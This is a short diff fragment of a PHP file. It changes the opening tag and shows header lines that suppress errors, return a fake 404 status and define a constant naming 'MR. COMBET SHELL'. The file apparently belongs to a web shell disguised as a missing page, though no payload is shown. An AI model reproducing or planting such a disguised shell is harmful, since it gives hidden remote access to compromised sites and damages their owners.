@@ -1,4 +1,4 @@
-<?=
+<?php
 error_reporting(0);
 http_response_code(404);
 define("Yp", "MR. COMBET SHELL");
